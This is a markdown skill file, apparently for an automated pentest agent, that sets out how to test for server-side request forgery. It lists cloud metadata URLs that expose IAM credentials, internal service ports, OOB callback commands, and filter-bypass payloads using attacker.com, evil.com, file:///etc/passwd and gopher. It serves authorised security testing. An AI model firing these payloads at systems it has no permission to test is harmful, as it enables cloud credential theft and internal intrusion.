---
name: ssrf
description: SSRF discovery, cloud metadata exploitation, OOB detection
applicable_contexts: [web, api, cloud]
---

## SSRF Testing Methodology

### Target Endpoints

- URL parameters: `?url=`, `?redirect=`, `?webhook=`, `?callback=`, `?endpoint=`, `?dest=`
- File fetch: avatar from URL, import from URL, document conversion
- PDF generators that fetch remote content (wkhtmltopdf, Puppeteer)
- SSO/OAuth redirect_uri manipulation
- XML/JSON body with URL fields
- Webhook configuration endpoints
- RSS/Atom feed parsers

### Cloud Metadata Targets

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token — test if v1 fallback exists)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Internal Service Probing

```
http://localhost:6379/   # Redis
http://localhost:9200/   # Elasticsearch
http://localhost:27017/  # MongoDB
http://localhost:5432/   # PostgreSQL
http://localhost:8500/   # Consul
http://127.0.0.1:2375/version  # Docker API
```

### OOB Detection

```bash
# interactsh listener
interactsh-client -server interactsh.com -o /workspace/oob.txt

# Burp Collaborator alternative
curl -X POST TARGET_URL -d '{"url": "http://COLLABORATOR_URL/ssrf-test"}'

# nuclei SSRF templates with OOB
nuclei -t ~/nuclei-templates/vulnerabilities/generic/ssrf*.yaml \
  -u TARGET_URL -interactsh-server interactsh.com -json
```

### Bypass Techniques

| Technique | Example |
|-----------|---------|
| Decimal IP | `http://2130706433/` (127.0.0.1) |
| Hex IP | `http://0x7f000001/` |
| Octal IP | `http://0177.0.0.1/` |
| IPv6 | `http://[::1]/`, `http://[::ffff:127.0.0.1]/` |
| URL encoding | `http://127.0.0.1%00@attacker.com/` |
| DNS rebinding | point attacker domain to 127.0.0.1 with low TTL |
| Redirect chain | `http://attacker.com/302 → http://169.254.169.254/` |
| URL parser confusion | `http://evil.com#@169.254.169.254/` |
| Case variation | `http://LocalHost/` |
| Alternative schemas | `file:///etc/passwd`, `gopher://`, `dict://` |

### Validation Requirements

- Demonstrate access to internal resource not publicly reachable
- Show metadata/credentials if cloud metadata accessible
- Document exact request showing SSRF trigger
- Confirm internal network topology discovery
- If blind: show OOB interaction proof (DNS/HTTP callback)

### Business Impact

- Cloud credential theft (IAM role keys → full account compromise)
- Internal service access (databases, caches, admin panels)
- Network reconnaissance (port scanning internal hosts)
- Data exfiltration from internal APIs
- Pivot to RCE via internal services (Redis SLAVEOF, Gopher+SMTP)
